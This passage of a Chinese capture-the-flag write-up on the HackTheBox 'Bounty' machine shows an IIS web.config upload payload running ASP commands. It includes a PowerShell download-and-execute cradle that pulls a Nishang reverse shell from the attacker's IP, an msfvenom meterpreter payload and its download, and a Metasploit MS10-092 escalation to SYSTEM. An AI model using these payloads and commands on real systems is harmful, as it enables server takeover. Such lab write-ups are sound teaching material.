+<a id="__codelineno-2-10" name="__codelineno-2-10" href="#__codelineno-2-10"></a>               &lt;remove fileExtension=&quot;.config&quot; /&gt;
+<a id="__codelineno-2-11" name="__codelineno-2-11" href="#__codelineno-2-11"></a>            &lt;/fileExtensions&gt;
+<a id="__codelineno-2-12" name="__codelineno-2-12" href="#__codelineno-2-12"></a>            &lt;hiddenSegments&gt;
+<a id="__codelineno-2-13" name="__codelineno-2-13" href="#__codelineno-2-13"></a>               &lt;remove segment=&quot;web.config&quot; /&gt;
+<a id="__codelineno-2-14" name="__codelineno-2-14" href="#__codelineno-2-14"></a>            &lt;/hiddenSegments&gt;
+<a id="__codelineno-2-15" name="__codelineno-2-15" href="#__codelineno-2-15"></a>         &lt;/requestFiltering&gt;
+<a id="__codelineno-2-16" name="__codelineno-2-16" href="#__codelineno-2-16"></a>      &lt;/security&gt;
+<a id="__codelineno-2-17" name="__codelineno-2-17" href="#__codelineno-2-17"></a>   &lt;/system.webServer&gt;
+<a id="__codelineno-2-18" name="__codelineno-2-18" href="#__codelineno-2-18"></a>   &lt;appSettings&gt;
+<a id="__codelineno-2-19" name="__codelineno-2-19" href="#__codelineno-2-19"></a>&lt;/appSettings&gt;
+<a id="__codelineno-2-20" name="__codelineno-2-20" href="#__codelineno-2-20"></a>&lt;/configuration&gt;
+<a id="__codelineno-2-21" name="__codelineno-2-21" href="#__codelineno-2-21"></a>&lt;!–-
+<a id="__codelineno-2-22" name="__codelineno-2-22" href="#__codelineno-2-22"></a>&lt;% Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;)
+<a id="__codelineno-2-23" name="__codelineno-2-23" href="#__codelineno-2-23"></a>Response.write(&quot;&lt;pre&gt;&quot;)
+<a id="__codelineno-2-24" name="__codelineno-2-24" href="#__codelineno-2-24"></a>Set wShell1 = CreateObject(&quot;WScript.Shell&quot;)
+<a id="__codelineno-2-25" name="__codelineno-2-25" href="#__codelineno-2-25"></a>Set cmd1 = wShell1.Exec(&quot;ipconfig&quot;)
+<a id="__codelineno-2-26" name="__codelineno-2-26" href="#__codelineno-2-26"></a>output1 = cmd1.StdOut.Readall()
+<a id="__codelineno-2-27" name="__codelineno-2-27" href="#__codelineno-2-27"></a>set cmd1 = nothing: Set wShell1 = nothing
+<a id="__codelineno-2-28" name="__codelineno-2-28" href="#__codelineno-2-28"></a>Response.write(output1)
+<a id="__codelineno-2-29" name="__codelineno-2-29" href="#__codelineno-2-29"></a>Response.write(&quot;&lt;/pre&gt;&lt;!-&quot;&amp;&quot;-&quot;) %&gt;
+<a id="__codelineno-2-30" name="__codelineno-2-30" href="#__codelineno-2-30"></a>
+<a id="__codelineno-2-31" name="__codelineno-2-31" href="#__codelineno-2-31"></a>-–&gt;
+</code></pre></div>
+<p>上面文件上传以后访问<code>http://10.10.10.93/uploadedfiles/web.config</code>成功打印<code>ipconfig</code>命令</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>Windows IP Configuration
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a>Ethernet adapter Local Area Connection:
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a>   Connection-specific DNS Suffix  . : 
+<a id="__codelineno-3-6" name="__codelineno-3-6" href="#__codelineno-3-6"></a>   IPv4 Address. . . . . . . . . . . : 10.10.10.93
+<a id="__codelineno-3-7" name="__codelineno-3-7" href="#__codelineno-3-7"></a>   Subnet Mask . . . . . . . . . . . : 255.255.255.0
+<a id="__codelineno-3-8" name="__codelineno-3-8" href="#__codelineno-3-8"></a>   Default Gateway . . . . . . . . . : 10.10.10.2
+<a id="__codelineno-3-9" name="__codelineno-3-9" href="#__codelineno-3-9"></a>
+<a id="__codelineno-3-10" name="__codelineno-3-10" href="#__codelineno-3-10"></a>Tunnel adapter isatap.{27C3F487-28AC-4CE6-AE3A-1F23518EF7A7}:
+<a id="__codelineno-3-11" name="__codelineno-3-11" href="#__codelineno-3-11"></a>
+<a id="__codelineno-3-12" name="__codelineno-3-12" href="#__codelineno-3-12"></a>   Media State . . . . . . . . . . . : Media disconnected
+<a id="__codelineno-3-13" name="__codelineno-3-13" href="#__codelineno-3-13"></a>   Connection-specific DNS Suffix  . :
+</code></pre></div>
+<h2 id="shell">反弹shell<a class="headerlink" href="#shell" title="Permanent link">&para;</a></h2>
+<blockquote>
+<p>PowerShell的反弹shell和Linux中的bash反弹shell有什么区别?</p>
+<ol>
+<li>语法差异：</li>
+</ol>
+<p>PowerShell 使用<strong>对象管道（Object Pipeline）来处理数据</strong>，允许将对象传递给命令以及从命令中接收对象。这使得 PowerShell 可以直接处理和操作 .NET 对象。
+Bash 则是<strong>基于文本流</strong>的，通常使用管道将文本传递给命令。它处理文本输入和输出，不支持直接操作对象。
+2. 命令和函数：
+PowerShell 提供了大量的命令和函数，可以直接处理对象、操作文件系统、管理进程等。它具有丰富的功能和扩展性。
+Bash 也提供了丰富的命令和函数，但相较于 PowerShell，它更专注于文本处理和系统级操作。
+3. 跨平台性：
+PowerShell 最初是为 Windows 平台设计的，虽然在最近的版本中增加了对 Linux 和 macOS 的支持，但它的主要用户群体仍然是 Windows 用户。
+Bash 是 Linux 和类 Unix 系统的标准 shell，几乎所有的 Linux 发行版都默认安装了它，因此它在跨平台方面更具优势。</p>
+</blockquote>
+<p><strong>参考链接:[<a href="https://www.cnblogs.com/-mo-/p/11487997.html">Powershell反弹shell</a></strong>]</p>
+<p><em><u>Nishanghttps://github.com/samratashok/nishang是一个基于PowerShell的攻击框架，集合了一些PowerShell攻击脚本和有效载荷，可反弹TCP/ UDP/ HTTP/HTTPS/ ICMP等类型shell。</u></em></p>
+<p>首先，获取 Nishang 的 <a href="https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1">Invoke-PowerShellTcp.ps1</a> 的副本。然后在末尾添加一行以调用对我的回调。</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 4242
+</code></pre></div>
+<p>把web.config编辑成以下payload</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a>&lt;configuration&gt;
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>   &lt;system.webServer&gt;
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a>      &lt;handlers accessPolicy=&quot;Read, Script, Write&quot;&gt;
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>         &lt;add name=&quot;web_config&quot; path=&quot;*.config&quot; verb=&quot;*&quot; modules=&quot;IsapiModule&quot; scriptProcessor=&quot;%windir%\system32\inetsrv\asp.dll&quot; resourceType=&quot;Unspecified&quot; requireAccess=&quot;Write&quot; preCondition=&quot;bitness64&quot; /&gt;
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a>      &lt;/handlers&gt;
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a>      &lt;security&gt;
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a>         &lt;requestFiltering&gt;
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>            &lt;fileExtensions&gt;
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a>               &lt;remove fileExtension=&quot;.config&quot; /&gt;
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>            &lt;/fileExtensions&gt;
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a>            &lt;hiddenSegments&gt;
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>               &lt;remove segment=&quot;web.config&quot; /&gt;
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a>            &lt;/hiddenSegments&gt;
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a>         &lt;/requestFiltering&gt;
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a>      &lt;/security&gt;
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>   &lt;/system.webServer&gt;
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a>   &lt;appSettings&gt;
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a>&lt;/appSettings&gt;
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a>&lt;/configuration&gt;
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a>&lt;!–-
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>&lt;% Response.write(&quot;-&quot;&amp;&quot;-&gt;&quot;)
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a>Response.write(&quot;&lt;pre&gt;&quot;)
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>Set wShell1 = CreateObject(&quot;WScript.Shell&quot;)
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a>Set cmd1 = wShell1.Exec(&quot;cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring(&#39;http://10.10.14.3/Invoke-PowerShellTcp.ps1&#39;)&quot;)
+<a id="__codelineno-5-26" name="__codelineno-5-26" href="#__codelineno-5-26"></a>output1 = cmd1.StdOut.Readall()
+<a id="__codelineno-5-27" name="__codelineno-5-27" href="#__codelineno-5-27"></a>set cmd1 = nothing: Set wShell1 = nothing
+<a id="__codelineno-5-28" name="__codelineno-5-28" href="#__codelineno-5-28"></a>Response.write(output1)
+<a id="__codelineno-5-29" name="__codelineno-5-29" href="#__codelineno-5-29"></a>Response.write(&quot;&lt;/pre&gt;&lt;!-&quot;&amp;&quot;-&quot;) %&gt;
+<a id="__codelineno-5-30" name="__codelineno-5-30" href="#__codelineno-5-30"></a>
+<a id="__codelineno-5-31" name="__codelineno-5-31" href="#__codelineno-5-31"></a>-–&gt;
+</code></pre></div>
+<blockquote>
+<p>cmd.exe /c powershell.exe -c iex(new-object net.webclient).downloadstring('http://10.10.14.3/Invoke-PowerShellTcp.ps1'：</p>
+<ol>
+<li>cmd.exe /c: 这部分启动了 Windows 命令提示符（cmd.exe）并执行 /c 参数指定的命令。/c 参数告诉 cmd.exe 在执行完指定的命令后关闭命令提示符窗口。</li>
+<li>powershell.exe: 这部分启动了 PowerShell 程序。</li>
+<li>-c: 这是 PowerShell 的参数，表示后面跟着的是一条命令。</li>
+<li>iex(new-object net.webclient).downloadstring('http://10.10.14.3/Invoke-PowerShellTcp.ps1'): 这是 PowerShell 命令。iex 是 Invoke-Expression 的简写，它用于执行从字符串中构建的命令。在这个例子中，iex 用于执行从远程服务器下载的 PowerShell 脚本。new-object net.webclient 创建了一个新的 .NET WebClient 对象，然后 downloadstring 方法用于从指定的 URL 下载字符串（即远程脚本的内容）。整个表达式的目的是下载远程脚本内容。</li>
+<li>'http://10.10.14.3/Invoke-PowerShellTcp.ps1': 这是远程 PowerShell 脚本的 URL 地址，它将被下载并执行。</li>
+</ol>
+<p>因此，整个命令的作用是从 http://10.10.14.3/Invoke-PowerShellTcp.ps1 下载 PowerShell 脚本并执行它，从而建立到攻击者控制的远程服务器的 TCP 连接，提供一个交互式的 PowerShell shell。</p>
+</blockquote>
+<p>在本地开启一个http服务，准备传送Invoke-PowerShellTcp.ps1</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a>python3 -m http.server 80
+</code></pre></div>
+<p>kali开启监听接收反弹shell</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>nc -lnvp 4242
+</code></pre></div>
+<p>上传以后，打开http://10.10.10.93/uploadedfiles/web.config页面，拿到初始shell</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>root@kali# nc -lnvp 4242              
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>listening on [any] 4242 ...
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>connect to [10.10.14.3] from (UNKNOWN) [10.10.10.93] 49158
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>Windows PowerShell running as user BOUNTY$ on BOUNTY
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>Copyright (C) 2015 Microsoft Corporation. All rights reserved.
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>PS C:\windows\system32\inetsrv&gt;whoami
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>bounty\merlin
+</code></pre></div>
+<h1 id="_3">提权<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h1>
+<p>webshell不太稳定，我们编译一个稳定的meterpreter</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=4444 -f exe &gt; shell64.exe
+</code></pre></div>
+<p>在靶机依次执行下面两行代码，把shell下载到靶机</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>$client = new-object System.Net.WebClient
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>$client.DownloadFile(&#39;http://10.10.14.3:8000/shell64.exe&#39;, &#39;C:\users\merlin\Desktop\shell64.exe&#39;)
+</code></pre></div>
+<p><img alt="截图" src="a1f06d0f5dc9b7603ee5806a149394dc.png" /></p>
+<p>参考链接：<a href="https://blog.csdn.net/leoxow/article/details/129426642#:~:text=PowerShell%20%E8%AF%AD%E6%B3%95%201%20%E5%91%BD%E4%BB%A4%E8%AF%AD%E6%B3%95%3A%20%E6%A0%87%E5%87%86%E5%91%BD%E4%BB%A4%E8%AF%AD%E6%B3%95%EF%BC%9A-%EF%BC%88%E5%A6%82%20Get-ChildItem%EF%BC%89%20%E6%B4%BB%E5%8A%A8%E7%9B%AE%E5%BD%95%E5%91%BD%E4%BB%A4%E8%AF%AD%E6%B3%95%EF%BC%9A-%EF%BC%88%E5%A6%82%20Get-ADUser%EF%BC%89,5%20%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%EF%BC%9A%E4%BD%BF%E7%94%A8if%E3%80%81else%E5%92%8Celseif%E5%85%B3%E9%94%AE%E5%AD%97%E6%89%A7%E8%A1%8C%E6%9D%A1%E4%BB%B6%E8%AF%AD%E5%8F%A5%E3%80%82%206%20%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%EF%BC%9A%E5%B8%B8%E8%A7%81%E7%9A%84%E5%BE%AA%E7%8E%AF%E8%AF%AD%E5%8F%A5%E6%9C%89for%E3%80%81foreach%E3%80%81while%E3%80%82%207%20%E5%87%BD%E6%95%B0%EF%BC%9A%E4%BD%BF%E7%94%A8function%E5%85%B3%E9%94%AE%E5%AD%97%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E3%80%82%208%20%E6%B3%A8%E9%87%8A%EF%BC%9A%E6%B3%A8%E9%87%8A%E4%BB%A5%E4%BA%95%E5%8F%B7%EF%BC%88%23%EF%BC%89%E5%BC%80%E5%A4%B4%E3%80%82">PowerShell 语法</a></p>
+<p>powershell执行exe文件</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>&amp;&quot;C:\users\merlin\Desktop\shell64.exe&quot;
+</code></pre></div>
+<p>拿到meterpreter以后，把winPEAS.bat 传到靶机，枚举提权漏洞</p>
+<blockquote>
+<p>WinPEAS.bat 用于搜索在 Windows 主机上提升权限的可能路径。WinPEAS.bat 是为不支持 WinPEAS.exe 的 Windows 系统制作的批处理脚本，需要目标系统（.Net 4）环境，不支持打印输出颜色。如果要搜索可能包含密码的文件和注册表，需要在 WinPEAS.bat 脚本开头的long变量设置为 yes 。</p>
+<p>WinPEAS.bat下载地址：https://www.ddosi.org/peass-ng/#%E2%91%A0WinPEAS%E7%94%A8%E6%B3%95%E5%8F%8A%E8%AF%B4%E6%98%8E</p>
+<p>WinPEAS.bat使用地址：https://cloud.tencent.com/developer/article/2149150</p>
+</blockquote>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>&quot;Microsoft Windows Server 2008 R2 Datacenter &quot;                                                                                                                                                                                              
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>   [i] Possible exploits (https://github.com/codingo/OSCP-2/blob/master/Windows/WinPrivCheck.bat)                                                                                                                                           
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>MS11-080 patch is NOT installed XP/SP3,2K3/SP3-afd.sys)                                                                                                                                                                                     
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>MS16-032 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-secondary logon)                                                                                                                                                                  
+<a id="__codelineno-12-5" name="__codelineno-12-5" href="#__codelineno-12-5"></a>MS11-011 patch is NOT installed XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP1/2,7/SP0-WmiTraceMessageVa)                                                                                                                                               
+<a id="__codelineno-12-6" name="__codelineno-12-6" href="#__codelineno-12-6"></a>MS10-59 patch is NOT installed 2K8,Vista,7/SP0-Chimichurri)                                                                                                                                                                                 
+<a id="__codelineno-12-7" name="__codelineno-12-7" href="#__codelineno-12-7"></a>MS10-21 patch is NOT installed 2K/SP4,XP/SP2/3,2K3/SP2,2K8/SP2,Vista/SP0/1/2,7/SP0-Win Kernel)                                                                                                                                              
+<a id="__codelineno-12-8" name="__codelineno-12-8" href="#__codelineno-12-8"></a>MS10-092 patch is NOT installed 2K8/SP0/1/2,Vista/SP1/2,7/SP0-Task Sched)                                                                                                                                                                   
+<a id="__codelineno-12-9" name="__codelineno-12-9" href="#__codelineno-12-9"></a>MS10-073 patch is NOT installed XP/SP2/3,2K3/SP2/2K8/SP2,Vista/SP1/2,7/SP0-Keyboard Layout)                                                                                                                                                 
+<a id="__codelineno-12-10" name="__codelineno-12-10" href="#__codelineno-12-10"></a>MS17-017 patch is NOT installed 2K8/SP2,Vista/SP2,7/SP1-Registry Hive Loading)                                                                                                                                                              
+<a id="__codelineno-12-11" name="__codelineno-12-11" href="#__codelineno-12-11"></a>MS10-015 patch is NOT installed 2K,XP,2K3,2K8,Vista,7-User Mode to Ring)                                                                                                                                                                    
+<a id="__codelineno-12-12" name="__codelineno-12-12" href="#__codelineno-12-12"></a>MS08-025 patch is NOT installed 2K/SP4,XP/SP2,2K3/SP1/2,2K8/SP0,Vista/SP0/1-win32k.sys)                                                                                                                                                     
+<a id="__codelineno-12-13" name="__codelineno-12-13" href="#__codelineno-12-13"></a>MS06-049 patch is NOT installed 2K/SP4-ZwQuerySysInfo)                                                                                                                                                                                      
+<a id="__codelineno-12-14" name="__codelineno-12-14" href="#__codelineno-12-14"></a>MS06-030 patch is NOT installed 2K,XP/SP2-Mrxsmb.sys)                                                                                                                                                                                       
+<a id="__codelineno-12-15" name="__codelineno-12-15" href="#__codelineno-12-15"></a>MS05-055 patch is NOT installed 2K/SP4-APC Data-Free)                                                                                                                                                                                       
+<a id="__codelineno-12-16" name="__codelineno-12-16" href="#__codelineno-12-16"></a>MS05-018 patch is NOT installed 2K/SP3/4,XP/SP1/2-CSRSS)                                                                                                                                                                                    
+<a id="__codelineno-12-17" name="__codelineno-12-17" href="#__codelineno-12-17"></a>MS04-019 patch is NOT installed 2K/SP2/3/4-Utility Manager)                                                                                                                                                                                 
+<a id="__codelineno-12-18" name="__codelineno-12-18" href="#__codelineno-12-18"></a>MS04-011 patch is NOT installed 2K/SP2/3/4,XP/SP0/1-LSASS service BoF)                                                                                                                                                                      
+<a id="__codelineno-12-19" name="__codelineno-12-19" href="#__codelineno-12-19"></a>MS04-020 patch is NOT installed 2K/SP4-POSIX)                                                                                                                                                                                               
+<a id="__codelineno-12-20" name="__codelineno-12-20" href="#__codelineno-12-20"></a>MS14-040 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-afd.sys Dangling Pointer)                                                                                                                                                   
+<a id="__codelineno-12-21" name="__codelineno-12-21" href="#__codelineno-12-21"></a>MS16-016 patch is NOT installed 2K8/SP1/2,Vista/SP2,7/SP1-WebDAV to Address)                                                                                                                                                                
+<a id="__codelineno-12-22" name="__codelineno-12-22" href="#__codelineno-12-22"></a>MS15-051 patch is NOT installed 2K3/SP2,2K8/SP2,Vista/SP2,7/SP1-win32k.sys)                                                                                                                                                                 
+<a id="__codelineno-12-23" name="__codelineno-12-23" href="#__codelineno-12-23"></a>MS14-070 patch is NOT installed 2K3/SP2-TCP/IP)                                                                                                                                                                                             
+<a id="__codelineno-12-24" name="__codelineno-12-24" href="#__codelineno-12-24"></a>MS13-005 patch is NOT installed Vista,7,8,2008,2008R2,2012,RT-hwnd_broadcast)                                                                                                                                                               
+<a id="__codelineno-12-25" name="__codelineno-12-25" href="#__codelineno-12-25"></a>MS13-053 patch is NOT installed 7SP0/SP1_x86-schlamperei)                                                                                                                                                                                   
+<a id="__codelineno-12-26" name="__codelineno-12-26" href="#__codelineno-12-26"></a>MS13-081 patch is NOT installed 7SP0/SP1_x86-track_popup_menu)
+</code></pre></div>
+<p>可以看见靶机很多补丁没有安装，逐个枚举，使用MS10-092</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>msf6 exploit(windows/local/ms16_032_secondary_logon_handle_privesc) &gt; search MS10-092
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>Matching Modules
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>================
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a>   #  Name                                        Disclosure Date  Rank       Check  Description
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a>   -  ----                                        ---------------  ----       -----  -----------
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>   0  exploit/windows/local/ms10_092_schelevator  2010-09-13       excellent  Yes    Windows Escalate Task Scheduler XML Privilege Escalation
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a>
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a>Interact with a module by name or index. For example info 0, use 0 or use exploit/windows/local/ms10_092_schelevator
+</code></pre></div>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>msf6 exploit(windows/local/ms10_092_schelevator) &gt; run
+<a id="__codelineno-14-2" name="__codelineno-14-2" href="#__codelineno-14-2"></a>
+<a id="__codelineno-14-3" name="__codelineno-14-3" href="#__codelineno-14-3"></a>[*] Started reverse TCP handler on 10.10.14.3:4444 
+<a id="__codelineno-14-4" name="__codelineno-14-4" href="#__codelineno-14-4"></a>[*] Preparing payload at C:\Windows\TEMP\AoTizOUxSB.exe
+<a id="__codelineno-14-5" name="__codelineno-14-5" href="#__codelineno-14-5"></a>[*] Creating task: LXJM4TwyEqICqyv
+<a id="__codelineno-14-6" name="__codelineno-14-6" href="#__codelineno-14-6"></a>[*] SUCCESS: The scheduled task &quot;LXJM4TwyEqICqyv&quot; has successfully been created.
+<a id="__codelineno-14-7" name="__codelineno-14-7" href="#__codelineno-14-7"></a>[*] SCHELEVATOR
+<a id="__codelineno-14-8" name="__codelineno-14-8" href="#__codelineno-14-8"></a>[*] Reading the task file contents from C:\Windows\system32\tasks\LXJM4TwyEqICqyv...
+<a id="__codelineno-14-9" name="__codelineno-14-9" href="#__codelineno-14-9"></a>[*] Original CRC32: 0x866f314a
+<a id="__codelineno-14-10" name="__codelineno-14-10" href="#__codelineno-14-10"></a>[*] Final CRC32: 0x866f314a
+<a id="__codelineno-14-11" name="__codelineno-14-11" href="#__codelineno-14-11"></a>[*] Writing our modified content back...
+<a id="__codelineno-14-12" name="__codelineno-14-12" href="#__codelineno-14-12"></a>[*] Validating task: LXJM4TwyEqICqyv
+<a id="__codelineno-14-13" name="__codelineno-14-13" href="#__codelineno-14-13"></a>[*] 
+<a id="__codelineno-14-14" name="__codelineno-14-14" href="#__codelineno-14-14"></a>[*] Folder: \
+<a id="__codelineno-14-15" name="__codelineno-14-15" href="#__codelineno-14-15"></a>[*] TaskName                                 Next Run Time          Status         
+<a id="__codelineno-14-16" name="__codelineno-14-16" href="#__codelineno-14-16"></a>[*] ======================================== ====================== ===============
+<a id="__codelineno-14-17" name="__codelineno-14-17" href="#__codelineno-14-17"></a>[*] LXJM4TwyEqICqyv                          1/1/2022 5:38:00 AM    Ready          
+<a id="__codelineno-14-18" name="__codelineno-14-18" href="#__codelineno-14-18"></a>[*] SCHELEVATOR
+<a id="__codelineno-14-19" name="__codelineno-14-19" href="#__codelineno-14-19"></a>[*] Disabling the task...
+<a id="__codelineno-14-20" name="__codelineno-14-20" href="#__codelineno-14-20"></a>[*] SUCCESS: The parameters of scheduled task &quot;LXJM4TwyEqICqyv&quot; have been changed.
+<a id="__codelineno-14-21" name="__codelineno-14-21" href="#__codelineno-14-21"></a>[*] SCHELEVATOR
+<a id="__codelineno-14-22" name="__codelineno-14-22" href="#__codelineno-14-22"></a>[*] Enabling the task...
+<a id="__codelineno-14-23" name="__codelineno-14-23" href="#__codelineno-14-23"></a>[*] SUCCESS: The parameters of scheduled task &quot;LXJM4TwyEqICqyv&quot; have been changed.
+<a id="__codelineno-14-24" name="__codelineno-14-24" href="#__codelineno-14-24"></a>[*] SCHELEVATOR
+<a id="__codelineno-14-25" name="__codelineno-14-25" href="#__codelineno-14-25"></a>[*] Executing the task...
+<a id="__codelineno-14-26" name="__codelineno-14-26" href="#__codelineno-14-26"></a>[*] Sending stage (175174 bytes) to 10.10.10.93
+<a id="__codelineno-14-27" name="__codelineno-14-27" href="#__codelineno-14-27"></a>[*] SUCCESS: Attempted to run the scheduled task &quot;LXJM4TwyEqICqyv&quot;.
+<a id="__codelineno-14-28" name="__codelineno-14-28" href="#__codelineno-14-28"></a>[*] SCHELEVATOR
+<a id="__codelineno-14-29" name="__codelineno-14-29" href="#__codelineno-14-29"></a>[*] Deleting the task...
+<a id="__codelineno-14-30" name="__codelineno-14-30" href="#__codelineno-14-30"></a>[*] Meterpreter session 2 opened (10.10.14.3:4444 -&gt; 10.10.10.93:49175) at 2021-12-20 22:38:40 -0500
+<a id="__codelineno-14-31" name="__codelineno-14-31" href="#__codelineno-14-31"></a>[*] SUCCESS: The scheduled task &quot;LXJM4TwyEqICqyv&quot; was successfully deleted.
+<a id="__codelineno-14-32" name="__codelineno-14-32" href="#__codelineno-14-32"></a>[*] SCHELEVATOR
+<a id="__codelineno-14-33" name="__codelineno-14-33" href="#__codelineno-14-33"></a>
+<a id="__codelineno-14-34" name="__codelineno-14-34" href="#__codelineno-14-34"></a>meterpreter &gt; getuid
+<a id="__codelineno-14-35" name="__codelineno-14-35" href="#__codelineno-14-35"></a>Server username: NT AUTHORITY\SYSTEM
+</code></pre></div>
+<p>已经拿到SYSTEM权限，至此我们可以读取系统内任何文件。</p>
+<h1 id="_4">总结<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h1>
+<p>本文渗透的是windows主机，nmap扫描出中间件是IIS7.5，通过网页信息知道靶机运行aspx程序</p>
+<p>爆破时选择字典指定了扩展名aspx</p>
+<p>当得知有一个上传点时，优先需要知道中间件的解析漏洞信息，以及rce利用信息</p>
+<p>通过rce得到初始shell</p>
+<p>提权的时候，看到初始用户开启了<code>SeImpersonatePrivilege</code>,也可以考虑用potato提权</p>
+<blockquote>
+<p>nishang框架是什么：</p>
+<p>Nishang是一个PowerShell攻击框架，它是PowerShell攻击脚本和有效载荷的一个集合。</p>
+<p>项目下载地址：https://github.com/samratashok/nishang</p>
+<p>Nishang powershell框架——使用教程：https://blog.csdn.net/weixin_40412037/article/details/115510209</p>
+<p>Windows安全之powershell反弹shell：https://blog.csdn.net/qq1113673178/article/details/123888025</p>
+</blockquote>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
